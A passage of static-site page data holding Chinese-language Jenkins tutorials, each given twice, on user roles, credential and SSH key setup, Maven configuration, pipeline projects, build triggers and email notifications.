角色\nroot2 用户分别绑定 baseRole 和 role2 角色\n\n\n\n\n\n\n# 建立项目\n\n\n\n\n\n\n\n\n\n\n# Jenkins 凭证管理\n\n凭据可以用来存储需要密文保护的数据库密码、Gitlab 密码信息、Docker 私有仓库密码等，以便 Jenkins 可以和这些第三方的应用进行交互。\n\n\n# 安装 Credentials Binding 插件\n\n要在 Jenkins 使用凭证管理功能，需要安装 Credentials Binding 插件\n\n\n\n\n\n\n\n\n\n\n\n * Username with password：用户名和密码\n * SSH Username with private key： 使用 SSH 用户和密钥\n * Secret file：需要保密的文本文件，使用时 Jenkins 会将文件复制到一个临时目录中，再将文件路径设置到一个变量中，等构建结束后，所复制的 Secret file 就会被删除。\n * Secret text：需要保存的一个加密的文本串，如钉钉机器人或 Github 的 api token\n * Certificate：通过上传证书文件的方式\n\n常用的凭证类型有：Username with password（用户密码）和 SSH Username with private key（SSH 密钥），接下来以使用 Git 工具到 Gitlab 拉取项目源码为例，演示 Jenkins 的如何管理 Gitlab 的凭证。\n\n\n# 安装 Git 插件和 Git 工具\n\n为了让 Jenkins 支持从 Gitlab 拉取源码，需要安装 Git 插件以及在 CentOS7 上安装 Git 工具。\n\n\n\n在 centos 上安装 git 工具\n\n# 安装\nyum install git -y \n# 安装后查看版本\ngit --version \n\n\n1\n2\n3\n4\n\n\n\n# 添加凭证（username & password）\n\n把你在 git 上的账号密码加入到凭证中。\n\n\n\n回到我们在 jenkins 的项目中，来配置这个项目。\n\n\n\n\n\n应用，然后保存。保存后我们构建这个项目\n\n\n\n\n\n构建成功后，可以看到 jenkins 会把项目在服务器中的 /var/lib/jenkins/workspace/test01 路径构建一个项目，通过这种方式代表我们配置 git 的凭证是成功的。\n\n\n# SSH 密钥类型\n\nSSH 免密登录示意图\n\n\n\n1. 使用 root 用户生成公钥和私钥\n\nssh-keygen -t rsa\n\n\n1\n\n\n在 /root/.ssh/ 目录保存了公钥和使用\n\n\n\nid_rsa：私钥文件\nid_rsa.pub：公钥文件\n\n2. 把生成的公钥的内容放在 Gitlab 中，我的是 Gitea\n\n\n\n3. 在 Jenkins 中添加凭证，配置私钥\n在 Jenkins 添加一个新的凭证，类型为 "SSH Username with private key"，把刚才生成私有文件内容复制过来\n\n\n\n这个 root，是你在 服务器，root 目录下生成的，所以填写 root，最后依然是在项目中配置一下 git 即可',normalizedContent:'# 用户管理\n\n我们可以利用 role-based authorization strategy 插件来管理 jenkins 用户权限\n\n\n# 安装 role-based authorization strategy 插件\n\n\n\n\n# 修改安全配置策略\n\n\n\n\n\n\n# 分配角色和用户\n\n\n\n\n\n\n\nglobal roles（全局角色）：管理员等高级用户可以创建基于全局的角色\nitem roles（项目角色）：针对某个或者某些项目的角色\nnode roles（节点角色）：节点相关的权限\n\n我们添加以下三个角色：\n\n * baserole：该角色为全局角色。这个角色需要绑定 overall 下面的 read 权限，是为了给所有用户绑定最基本的 jenkins 访问权限。注意：如果不给后续用户绑定这个角色，会报错误：用户名 ismissing the overall/read permission\n * role1：该角色为项目角色。使用正则表达式绑定 "itcast.*"，意思是只能操作 itcast 开头的项目。\n * role2：该角色也为项目角色。绑定 "itheima.*"，意思是只能操作 itheima 开头的项目。\n\n\n\n\n\n\n\n\n\n在系统管理页面进入 manage users\n\n\n\n\n\n给用户分配角色\n系统管理页面进入 manage and assign roles，点击 assign roles\n绑定规则如下：\nroot1 用户分别绑定 baserole 和 role1 角色\nroot2 用户分别绑定 baserole 和 role2 角色\n\n\n\n\n\n\n# 建立项目\n\n\n\n\n\n\n\n\n\n\n# jenkins 凭证管理\n\n凭据可以用来存储需要密文保护的数据库密码、gitlab 密码信息、docker 私有仓库密码等，以便 jenkins 可以和这些第三方的应用进行交互。\n\n\n# 安装 credentials binding 插件\n\n要在 jenkins 使用凭证管理功能，需要安装 credentials binding 插件\n\n\n\n\n\n\n\n\n\n\n\n * username with password：用户名和密码\n * ssh username with private key： 使用 ssh 用户和密钥\n * secret file：需要保密的文本文件，使用时 jenkins 会将文件复制到一个临时目录中，再将文件路径设置到一个变量中，等构建结束后，所复制的 secret file 就会被删除。\n * secret text：需要保存的一个加密的文本串，如钉钉机器人或 github 的 api token\n * certificate：通过上传证书文件的方式\n\n常用的凭证类型有：username with password（用户密码）和 ssh username with private key（ssh 密钥），接下来以使用 git 工具到 gitlab 拉取项目源码为例，演示 jenkins 的如何管理 gitlab 的凭证。\n\n\n# 安装 git 插件和 git 工具\n\n为了让 jenkins 支持从 gitlab 拉取源码，需要安装 git 插件以及在 centos7 上安装 git 工具。\n\n\n\n在 centos 上安装 git 工具\n\n# 安装\nyum install git -y \n# 安装后查看版本\ngit --version \n\n\n1\n2\n3\n4\n\n\n\n# 添加凭证（username & password）\n\n把你在 git 上的账号密码加入到凭证中。\n\n\n\n回到我们在 jenkins 的项目中，来配置这个项目。\n\n\n\n\n\n应用，然后保存。保存后我们构建这个项目\n\n\n\n\n\n构建成功后，可以看到 jenkins 会把项目在服务器中的 /var/lib/jenkins/workspace/test01 路径构建一个项目，通过这种方式代表我们配置 git 的凭证是成功的。\n\n\n# ssh 密钥类型\n\nssh 免密登录示意图\n\n\n\n1. 使用 root 用户生成公钥和私钥\n\nssh-keygen -t rsa\n\n\n1\n\n\n在 /root/.ssh/ 目录保存了公钥和使用\n\n\n\nid_rsa：私钥文件\nid_rsa.pub：公钥文件\n\n2. 把生成的公钥的内容放在 gitlab 中，我的是 gitea\n\n\n\n3. 在 jenkins 中添加凭证，配置私钥\n在 jenkins 添加一个新的凭证，类型为 "ssh username with private key"，把刚才生成私有文件内容复制过来\n\n\n\n这个 root，是你在 服务器，root 目录下生成的，所以填写 root，最后依然是在项目中配置一下 git 即可',charsets:{cjk:!0}},{title:"Jenkins(五) Jenkins构建Maven项目",frontmatter:{title:"Jenkins(五) Jenkins构建Maven项目",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/504",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/50.Jenkins/504.Jenkins(%E4%BA%94)%20Jenkins%E6%9E%84%E5%BB%BAMaven%E9%A1%B9%E7%9B%AE.html",relativePath:"04.运维/50.Jenkins/504.Jenkins(五) Jenkins构建Maven项目.md",key:"v-7d0dc8ff",path:"/jenkins/504/",headers:[{level:2,title:"自由风格项目构建",slug:"自由风格项目构建",normalizedTitle:"自由风格项目构建",charIndex:269},{level:2,title:"maven 项目",slug:"maven-项目",normalizedTitle:"maven 项目",charIndex:585},{level:2,title:"Pipeline流水线项目构建",slug:"pipeline流水线项目构建",normalizedTitle:"pipeline 流水线项目构建",charIndex:647},{level:3,title:"Pipeline简介",slug:"pipeline简介",normalizedTitle:"pipeline 简介",charIndex:668},{level:3,title:"安装Pipeline插件",slug:"安装pipeline插件",normalizedTitle:"安装 pipeline 插件",charIndex:1498},{level:3,title:"Scripted Pipeline脚本式-Pipeline",slug:"scripted-pipeline脚本式-pipeline",normalizedTitle:"scripted pipeline 脚本式 - pipeline",charIndex:2265},{level:2,title:"编译打包部署",slug:"编译打包部署",normalizedTitle:"编译打包部署",charIndex:2844},{level:3,title:"拉取代码",slug:"拉取代码",normalizedTitle:"拉取代码",charIndex:1766},{level:3,title:"编译打包",slug:"编译打包",normalizedTitle:"编译打包",charIndex:323},{level:3,title:"远程部署",slug:"远程部署",normalizedTitle:"远程部署",charIndex:2942},{level:2,title:"把jenkins的Pipeline脚本放到项目中执行（Pipeline Script from SCM）",slug:"把jenkins的pipeline脚本放到项目中执行-pipeline-script-from-scm",normalizedTitle:"把 jenkins 的 pipeline 脚本放到项目中执行（pipeline script from scm）",charIndex:3005}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"自由风格项目构建 maven 项目 Pipeline流水线项目构建 Pipeline简介 安装Pipeline插件 Scripted Pipeline脚本式-Pipeline 编译打包部署 拉取代码 编译打包 远程部署 把jenkins的Pipeline脚本放到项目中执行（Pipeline Script from SCM）",content:"Jenkins 中自动构建项目的类型有很多，常用的有以下三种：\n\n * 自由风格软件项目（FreeStyle Project）可以构建不同语言的项目\n * Maven 项目（Maven Project）专门准对 java 语言项目\n * 流水线项目（Pipeline Project）灵活度高，用代码编写 jenkins 构建过程，如 k8s\n\n每种类型的构建其实都可以完成一样的构建过程与结果，只是在操作方式、灵活度等方面有所区别，在实际开发中可以根据自己的需求和习惯来选择。（PS：个人推荐使用流水线类型，因为灵活度非常高）\n\n\n# 自由风格项目构建\n\n1. 创建自由风格项目\n\n\n\n\n\n2. 配置 git\n\n\n\n3. 构建\n\n\n\n\n\n4. 编译打包\n\necho \"开始编译和打包\"\nmvn clean package\necho \"编译和打包结束\"\n\n\n1\n2\n3\n\n\n\n\n\n\n\n\n5. 部署到目标机\n安装 Deploy to container 插件，这种插件适合发布 war 这种类型的项目，到 tomcat 等容器上去。\n\n\n\n\n\n\n\n\n\ntomcat 凭证需要自己百度去配置以下，当你配置成功后，可以访问到 tomcat 的 IP:8080/manager/html 页面，配置完后回到 jenkins，部署远程 tomcat 的时候需要这个凭证。\n\n\n# maven 项目\n\n1. 安装 Maven Integration 插件\n2. 构建 maven 项目\n\n\n\n\n\n\n\n\n# Pipeline 流水线项目构建\n\n\n# Pipeline 简介\n\nPipeline，简单来说，就是一套运行在 Jenkins 上的工作流框架，将原来独立运行于单个或者多个节点的任务连接起来，实现单个任务难以完成的复杂流程编排和可视化的工作。\n\n使用 Pipeline 有以下好处：\n\n * 代码：Pipeline 以代码的形式实现，通常被检入源代码控制，使团队能够编辑，审查和迭代其传送流程。\n * 持久：无论是计划内的还是计划外的服务器重启，Pipeline 都是可恢复的。\n * 可停止：Pipeline 可接收交互式输入，以确定是否继续执行 Pipeline\n * 多功能：Pipeline 支持现实世界中复杂的持续交付要求。它支持 fork/join、循环执行，并行执行任务的功能。\n * 可扩展：Pipeline 插件支持其 DSL 的自定义扩展 ，以及与其他插件集成的多个选项。\n\n如何创建 Jenkins Pipeline：\n\n * Pipeline 脚本是由 Groovy 语言实现的，但是我们没必要单独去学习 Groovy\n * Pipeline 支持两种语法：Declarative (声明式) 和 Scripted Pipeline (脚本式) 语法，Scripted Pipeline 支持更多的 groovy 语言，不像前者受那么多的结构化限制。由于可以编写灵活的逻辑，可以认为是高级版的 pipeline，如果你想实现的逻辑比较灵活，比如有判断、分支，或者需要用 groovy 语言编写复杂的运行步骤，都应该选择使用 Scripted Pipeline。\n * Pipeline 也有两种创建方法：可以直接在 Jenkins 的 Web UI 界面中输入脚本；也可以通过创建一个 Jenkinsfile 脚本文件放入项目源码库中（一般我们都推荐在 Jenkins 中直接从源代码控制 (SCM) 中直接载入 Jenkinsfile Pipeline 这种方法）。\n\n\n# 安装 Pipeline 插件\n\n\n\n> 安装完毕记得重启\n\n安装插件有很多依赖插件会安装失败，不用管，只要创建项目的时候多了 “流水线” 类型即可。\n\n\n\n你会在项目的配置中看到多了一个流水线，它就是取代了以上项目的构建和构建后的一些工作。\n\n\n\n以上是基于一个声明式 **（Declarative）的 Pipeline**，以 pipeline 开头的就是声明式的。\nstages：代表整个流水线的所有执行阶段。通常 stages 只有 1 个，里面包含多个 stage\nstage：代表流水线中的某个阶段，可能出现 n 个。一般分为拉取代码，编译构建，部署等阶段。\nsteps：代表一个阶段内需要执行的逻辑 (步骤)。steps 里面是 shell 脚本，git 拉取代码，ssh 远程发布等任意内容。\n模拟一段，然后执行看看效果\n\npipeline {\n    agent any\n\n    stages {\n        stage('拉取代码') {\n            steps {\n                echo '拉取代码'\n            }\n        }\n        stage('编译构建') {\n            steps {\n                echo '编译构建'\n            }\n        }\n        stage('项目部署') {\n            steps {\n                echo '项目部署'\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n\n\n# Scripted Pipeline 脚本式 - Pipeline\n\n\n\n * Node：节点，一个 Node 就是一个 Jenkins 节点，Master 或者 Agent，是执行 Step 的具体运行环境，后续讲到 Jenkins 的 Master-Slave 架构的时候用到。\n * Stage：阶段，一个 Pipeline 可以划分为若干个 Stage，每个 Stage 代表一组操作，比如：Build、Test、Deploy，Stage 是一个逻辑分组的概念。\n * Step：步骤，Step 是最基本的操作单元，可以是打印一句话，也可以是构建一个 Docker 镜像，由各类 Jenkins 插件提供，比如命令：sh ‘make’，就相当于我们平时 shell 终端中执行 make 命令一样。\n\nnode {\n    def mvnHome\n    stage('拉取代码') { // for display purposes\n        echo '拉取代码'\n    }\n    stage('编译构建') {\n        echo '编译构建'\n    }\n    stage('项目部署') {\n        echo '项目部署'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n\n\n\n\n# 编译打包部署\n\n\n# 拉取代码\n\n关于声明式的 code 编写，可以通过快捷的方式生成\n\n\n\n\n\n在这里可以配置我们的 git 项目拉取地址\n\n\n\n\n\n\n\n\n# 编译打包\n\n\n\n\n\n\n\n\n\n\n# 远程部署\n\n\n\n得到后依然编译执行。如果是 jar 包的，可以提前在服务器写好脚本执行，在 sh ' 执行你的脚本'\n\n\n# 把 jenkins 的 Pipeline 脚本放到项目中执行（Pipeline Script from SCM）\n\n刚才我们都是直接在 Jenkins 的 UI 界面编写 Pipeline 代码，这样不方便脚本维护，建议把 Pipeline 脚本放在项目中（一起进行版本控制）\n\n1. 在项目根目录建立 Jenkinsfile 文件，把内容复制到该文件中，并提交到 git 仓库\n\n\n\n2. 在项目中引用该文件\n\n\n\n\n\n\n\n",normalizedContent:"jenkins 中自动构建项目的类型有很多，常用的有以下三种：\n\n * 自由风格软件项目（freestyle project）可以构建不同语言的项目\n * maven 项目（maven project）专门准对 java 语言项目\n * 流水线项目（pipeline project）灵活度高，用代码编写 jenkins 构建过程，如 k8s\n\n每种类型的构建其实都可以完成一样的构建过程与结果，只是在操作方式、灵活度等方面有所区别，在实际开发中可以根据自己的需求和习惯来选择。（ps：个人推荐使用流水线类型，因为灵活度非常高）\n\n\n# 自由风格项目构建\n\n1. 创建自由风格项目\n\n\n\n\n\n2. 配置 git\n\n\n\n3. 构建\n\n\n\n\n\n4. 编译打包\n\necho \"开始编译和打包\"\nmvn clean package\necho \"编译和打包结束\"\n\n\n1\n2\n3\n\n\n\n\n\n\n\n\n5. 部署到目标机\n安装 deploy to container 插件，这种插件适合发布 war 这种类型的项目，到 tomcat 等容器上去。\n\n\n\n\n\n\n\n\n\ntomcat 凭证需要自己百度去配置以下，当你配置成功后，可以访问到 tomcat 的 ip:8080/manager/html 页面，配置完后回到 jenkins，部署远程 tomcat 的时候需要这个凭证。\n\n\n# maven 项目\n\n1. 安装 maven integration 插件\n2. 构建 maven 项目\n\n\n\n\n\n\n\n\n# pipeline 流水线项目构建\n\n\n# pipeline 简介\n\npipeline，简单来说，就是一套运行在 jenkins 上的工作流框架，将原来独立运行于单个或者多个节点的任务连接起来，实现单个任务难以完成的复杂流程编排和可视化的工作。\n\n使用 pipeline 有以下好处：\n\n * 代码：pipeline 以代码的形式实现，通常被检入源代码控制，使团队能够编辑，审查和迭代其传送流程。\n * 持久：无论是计划内的还是计划外的服务器重启，pipeline 都是可恢复的。\n * 可停止：pipeline 可接收交互式输入，以确定是否继续执行 pipeline\n * 多功能：pipeline 支持现实世界中复杂的持续交付要求。它支持 fork/join、循环执行，并行执行任务的功能。\n * 可扩展：pipeline 插件支持其 dsl 的自定义扩展 ，以及与其他插件集成的多个选项。\n\n如何创建 jenkins pipeline：\n\n * pipeline 脚本是由 groovy 语言实现的，但是我们没必要单独去学习 groovy\n * pipeline 支持两种语法：declarative (声明式) 和 scripted pipeline (脚本式) 语法，scripted pipeline 支持更多的 groovy 语言，不像前者受那么多的结构化限制。由于可以编写灵活的逻辑，可以认为是高级版的 pipeline，如果你想实现的逻辑比较灵活，比如有判断、分支，或者需要用 groovy 语言编写复杂的运行步骤，都应该选择使用 scripted pipeline。\n * pipeline 也有两种创建方法：可以直接在 jenkins 的 web ui 界面中输入脚本；也可以通过创建一个 jenkinsfile 脚本文件放入项目源码库中（一般我们都推荐在 jenkins 中直接从源代码控制 (scm) 中直接载入 jenkinsfile pipeline 这种方法）。\n\n\n# 安装 pipeline 插件\n\n\n\n> 安装完毕记得重启\n\n安装插件有很多依赖插件会安装失败，不用管，只要创建项目的时候多了 “流水线” 类型即可。\n\n\n\n你会在项目的配置中看到多了一个流水线，它就是取代了以上项目的构建和构建后的一些工作。\n\n\n\n以上是基于一个声明式 **（declarative）的 pipeline**，以 pipeline 开头的就是声明式的。\nstages：代表整个流水线的所有执行阶段。通常 stages 只有 1 个，里面包含多个 stage\nstage：代表流水线中的某个阶段，可能出现 n 个。一般分为拉取代码，编译构建，部署等阶段。\nsteps：代表一个阶段内需要执行的逻辑 (步骤)。steps 里面是 shell 脚本，git 拉取代码，ssh 远程发布等任意内容。\n模拟一段，然后执行看看效果\n\npipeline {\n    agent any\n\n    stages {\n        stage('拉取代码') {\n            steps {\n                echo '拉取代码'\n            }\n        }\n        stage('编译构建') {\n            steps {\n                echo '编译构建'\n            }\n        }\n        stage('项目部署') {\n            steps {\n                echo '项目部署'\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n\n\n# scripted pipeline 脚本式 - pipeline\n\n\n\n * node：节点，一个 node 就是一个 jenkins 节点，master 或者 agent，是执行 step 的具体运行环境，后续讲到 jenkins 的 master-slave 架构的时候用到。\n * stage：阶段，一个 pipeline 可以划分为若干个 stage，每个 stage 代表一组操作，比如：build、test、deploy，stage 是一个逻辑分组的概念。\n * step：步骤，step 是最基本的操作单元，可以是打印一句话，也可以是构建一个 docker 镜像，由各类 jenkins 插件提供，比如命令：sh ‘make’，就相当于我们平时 shell 终端中执行 make 命令一样。\n\nnode {\n    def mvnhome\n    stage('拉取代码') { // for display purposes\n        echo '拉取代码'\n    }\n    stage('编译构建') {\n        echo '编译构建'\n    }\n    stage('项目部署') {\n        echo '项目部署'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n\n\n\n\n# 编译打包部署\n\n\n# 拉取代码\n\n关于声明式的 code 编写，可以通过快捷的方式生成\n\n\n\n\n\n在这里可以配置我们的 git 项目拉取地址\n\n\n\n\n\n\n\n\n# 编译打包\n\n\n\n\n\n\n\n\n\n\n# 远程部署\n\n\n\n得到后依然编译执行。如果是 jar 包的，可以提前在服务器写好脚本执行，在 sh ' 执行你的脚本'\n\n\n# 把 jenkins 的 pipeline 脚本放到项目中执行（pipeline script from scm）\n\n刚才我们都是直接在 jenkins 的 ui 界面编写 pipeline 代码，这样不方便脚本维护，建议把 pipeline 脚本放在项目中（一起进行版本控制）\n\n1. 在项目根目录建立 jenkinsfile 文件，把内容复制到该文件中，并提交到 git 仓库\n\n\n\n2. 在项目中引用该文件\n\n\n\n\n\n\n\n",charsets:{cjk:!0}},{title:"Jenkins(四) Maven安装和配置",frontmatter:{title:"Jenkins(四) Maven安装和配置",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/503",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/50.Jenkins/503.Jenkins(%E5%9B%9B)%20Maven%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE.html",relativePath:"04.运维/50.Jenkins/503.Jenkins(四) Maven安装和配置.md",key:"v-2ae3d180",path:"/jenkins/503/",headers:[{level:2,title:"安装Maven",slug:"安装maven",normalizedTitle:"安装 maven",charIndex:21},{level:3,title:"配置环境变量",slug:"配置环境变量",normalizedTitle:"配置环境变量",charIndex:181},{level:3,title:"全局工具配置关联JDK和Maven",slug:"全局工具配置关联jdk和maven",normalizedTitle:"全局工具配置关联 jdk 和 maven",charIndex:405},{level:3,title:"添加Jenkins全局变量",slug:"添加jenkins全局变量",normalizedTitle:"添加 jenkins 全局变量",charIndex:492},{level:3,title:"修改Maven的settings.xml",slug:"修改maven的settings-xml",normalizedTitle:"修改 maven 的 settings.xml",charIndex:516},{level:3,title:"测试Maven是否配置成功",slug:"测试maven是否配置成功",normalizedTitle:"测试 maven 是否配置成功",charIndex:889}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"安装Maven 配置环境变量 全局工具配置关联JDK和Maven 添加Jenkins全局变量 修改Maven的settings.xml 测试Maven是否配置成功",content:"在 Jenkins 集成服务器上，我们需要安装 Maven 来编译和打包项目。\n\n\n# 安装 Maven\n\n先上传 Maven 软件到服务器\n\n# 解压\ntar -xzf apache-maven-3.6.2-bin.tar.gz \n# 移动文件\nmv apache-maven-3.6.2 /opt/software/maven\n\n\n1\n2\n3\n4\n\n\n\n# 配置环境变量\n\nvim /etc/profile\nexport JAVA_HOME=/opt/software/java8\nexport MAVEN_HOME=/opt/software/maven\nexport PATH=$PATH:$JAVA_HOME/bin:$MAVEN_HOME/bin\n\n\n1\n2\n3\n4\n\n\n# 配置生效\nsource /etc/profile \n# 查找Maven版本\nmvn -v \n\n\n1\n2\n3\n4\n\n\n\n# 全局工具配置关联 JDK 和 Maven\n\nJenkins->Global Tool Configuration->JDK-> 新增 JDK，配置如下：\n\n\n\n\n\n\n\n\n# 添加 Jenkins 全局变量\n\n\n\n\n\n\n# 修改 Maven 的 settings.xml\n\n# 创建本地仓库目录\nmkdir /opt/software/maven/repo \n# 修改文件内容\nvi /opt/software/maven/conf/settings.xml\n\n\n1\n2\n3\n4\n\n\n<localRepository>/opt/software/maven/repo</localRepository>\n<mirror>\n\t<id>alimaven</id>\n\t<name>aliyun maven</name>\n\t<url>https://maven.aliyun.com/nexus/content/groups/public/</url>\n\t<mirrorOf>central</mirrorOf>\n</mirror> \n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 测试 Maven 是否配置成功\n\n使用之前的 gitlab 密码测试项目，修改 jenkins 项目配置\n\n\n\n\n\n\n\n\n\n我们到 jenkins 服务器的 /var/lib/jenkins/workspace/test01/target/ 下面就可以看到我们打的 jar 包\n\n> 这里反馈一个问题，我这里使用的是 maven 私服（nexus），maven 配置成功但项目就是没办法拉取到自己发布的 jar，原因是我下载的是 maven3.8.x，换成 3.6 就可以了，看到原因说是因为 3.8.x 新加了 jar 的安全阻塞问题。",normalizedContent:"在 jenkins 集成服务器上，我们需要安装 maven 来编译和打包项目。\n\n\n# 安装 maven\n\n先上传 maven 软件到服务器\n\n# 解压\ntar -xzf apache-maven-3.6.2-bin.tar.gz \n# 移动文件\nmv apache-maven-3.6.2 /opt/software/maven\n\n\n1\n2\n3\n4\n\n\n\n# 配置环境变量\n\nvim /etc/profile\nexport java_home=/opt/software/java8\nexport maven_home=/opt/software/maven\nexport path=$path:$java_home/bin:$maven_home/bin\n\n\n1\n2\n3\n4\n\n\n# 配置生效\nsource /etc/profile \n# 查找maven版本\nmvn -v \n\n\n1\n2\n3\n4\n\n\n\n# 全局工具配置关联 jdk 和 maven\n\njenkins->global tool configuration->jdk-> 新增 jdk，配置如下：\n\n\n\n\n\n\n\n\n# 添加 jenkins 全局变量\n\n\n\n\n\n\n# 修改 maven 的 settings.xml\n\n# 创建本地仓库目录\nmkdir /opt/software/maven/repo \n# 修改文件内容\nvi /opt/software/maven/conf/settings.xml\n\n\n1\n2\n3\n4\n\n\n<localrepository>/opt/software/maven/repo</localrepository>\n<mirror>\n\t<id>alimaven</id>\n\t<name>aliyun maven</name>\n\t<url>https://maven.aliyun.com/nexus/content/groups/public/</url>\n\t<mirrorof>central</mirrorof>\n</mirror> \n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 测试 maven 是否配置成功\n\n使用之前的 gitlab 密码测试项目，修改 jenkins 项目配置\n\n\n\n\n\n\n\n\n\n我们到 jenkins 服务器的 /var/lib/jenkins/workspace/test01/target/ 下面就可以看到我们打的 jar 包\n\n> 这里反馈一个问题，我这里使用的是 maven 私服（nexus），maven 配置成功但项目就是没办法拉取到自己发布的 jar，原因是我下载的是 maven3.8.x，换成 3.6 就可以了，看到原因说是因为 3.8.x 新加了 jar 的安全阻塞问题。",charsets:{cjk:!0}},{title:"Jenkins(六) Jenkins项目构建细节",frontmatter:{title:"Jenkins(六) Jenkins项目构建细节",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/505",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/50.Jenkins/505.Jenkins(%E5%85%AD)%20Jenkins%E9%A1%B9%E7%9B%AE%E6%9E%84%E5%BB%BA%E7%BB%86%E8%8A%82.html",relativePath:"04.运维/50.Jenkins/505.Jenkins(六) Jenkins项目构建细节.md",key:"v-2df2013e",path:"/jenkins/505/",headers:[{level:2,title:"内置触发器",slug:"内置触发器",normalizedTitle:"内置触发器",charIndex:2},{level:3,title:"远程构建",slug:"远程构建",normalizedTitle:"远程构建",charIndex:36},{level:3,title:"其他工程构建后触发",slug:"其他工程构建后触发",normalizedTitle:"其他工程构建后触发",charIndex:60},{level:3,title:"定时构建",slug:"定时构建",normalizedTitle:"定时构建",charIndex:135},{level:3,title:"轮询SCM",slug:"轮询scm",normalizedTitle:"轮询 scm",charIndex:188},{level:2,title:"Git hook自动触发构建",slug:"git-hook自动触发构建",normalizedTitle:"git hook 自动触发构建",charIndex:843},{level:3,title:"安装Gitlab Hook插件",slug:"安装gitlab-hook插件",normalizedTitle:"安装 gitlab hook 插件",charIndex:991},{level:2,title:"Jenkins的参数化构建",slug:"jenkins的参数化构建",normalizedTitle:"jenkins 的参数化构建",charIndex:1189},{level:3,title:"String Parameter",slug:"string-parameter",normalizedTitle:"string parameter",charIndex:1290},{level:2,title:"配置邮箱服务器发送构建结果",slug:"配置邮箱服务器发送构建结果",normalizedTitle:"配置邮箱服务器发送构建结果",charIndex:1373},{level:3,title:"安装 Email Extension 插件",slug:"安装-email-extension-插件",normalizedTitle:"安装 email extension 插件",charIndex:1391},{level:3,title:"准备邮件内容",slug:"准备邮件内容",normalizedTitle:"准备邮件内容",charIndex:1518},{level:2,title:"jenkins 配置 SonarQube（代码审查）",slug:"jenkins-配置-sonarqube-代码审查",normalizedTitle:"jenkins 配置 sonarqube（代码审查）",charIndex:5380}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"内置触发器 远程构建 其他工程构建后触发 定时构建 轮询SCM Git hook自动触发构建 安装Gitlab Hook插件 Jenkins的参数化构建 String Parameter 配置邮箱服务器发送构建结果 安装 Email Extension 插件 准备邮件内容 jenkins 配置 SonarQube（代码审查）",content:'# 内置触发器\n\nJenkins 内置 4 种构建触发器：\n\n * 触发远程构建，通过一个远程地址触发项目的执行\n * 其他工程构建后触发（Build after other projects are build），就是需要前面一个项目构建完成后触发我的项目构建\n * 定时构建（Build periodically），顾名思义就是 类似于 corn 表达式，定时执行\n * 轮询 SCM（Poll SCM），会定时扫描本地代码仓库是否有变更，如果代码有变更就触发项目构建\n\n\n# 远程构建\n\n在项目中的配置中，构建触发器选中远程构建。\n\n\n\n通过浏览器访问 http://192.168.81.102:7777/job/test01/build?token=6666 进行项目构建\n\n\n# 其他工程构建后触发\n\n\n\n\n\n应用保存后，就可以构建 maven_project 了。\n\n\n# 定时构建\n\n定时字符串从左往右分别为： 分 时 日 月 周\n一些定时表达式的例子：\n\n# 每30分钟构建一次：H代表形参(代表小时，测试用 *)\nH/30 * * * * 10:02 10:32\n# 每2个小时构建一次: \nH H/2 * * *\n# 每天的8点，12点，22点，一天构建3次： (多个时间点中间用逗号隔开) \n0 8,12,22 * * *\n# 每天中午12点定时构建一次 \nH 12 * * *\n# 每天下午18点定时构建一次 \nH 18 * * *\n# 在每个小时的前半个小时内的每10分钟 H(0-29)/10 * * * *\n# 每两小时一次，每个工作日上午9点到下午5点(也许是上午10:38，下午12:38，下午2:38，下午4:38) H H(9-16)/2 * * 1-5\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n\n\n# 轮询 SCM\n\n该构建触发器，Jenkins 会定时扫描本地整个项目的代码，增大系统的开销，不建议使用。\n\n\n\n\n# Git hook 自动触发构建\n\n在 Jenkins 的内置构建触发器中，轮询 SCM 可以实现 Gitlab 代码更新，项目自动构建，但是该方案的性能不佳。那有没有更好的方案呢？ 有的。就是利用 Gitlab 的 webhook 实现代码 push 到仓库，立即触发项目自动构建。\n\n\n\n\n# 安装 Gitlab Hook 插件\n\n需要安装两个插件：Gitlab Hook 和 GitLab，安装好后在项目配置的构建触发器中，会多一个选项\n\n\n\n关于 Gitlab 之后的操作请百度，我这里使用的是 gitea。\n\ngitea 需要下载 Generic Webhook Trigger 插件，安装后到项目配置\n\n\n\n\n\n\n\n\n\n配置完成后就可以测试了，只要提交了代码就会构建项目。\n\n\n# Jenkins 的参数化构建\n\n有时在项目构建的过程中，我们需要根据用户的输入动态传入一些参数，从而影响整个构建结果，这时我们可以使用参数化构建。\n\nJenkins 支持非常丰富的参数类型\n\n\n\n\n# String Parameter\n\n这样的方式只能适用于 pipeline 项目\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n这种方式输入哪个分支，就构建哪个分支\n\n\n# 配置邮箱服务器发送构建结果\n\n\n# 安装 Email Extension 插件\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n可以测试发送\n\n> 如果 jenkins 报错： Can\'t send command to SMTP host; 有可能是管理员的邮箱没有填写或者和认证者的邮箱不相同。\n\n\n# 准备邮件内容\n\n在项目根目录编写 email.html，并把文件推送 git\n\n<!DOCTYPE html>\n<html>\n<head>\n    <meta 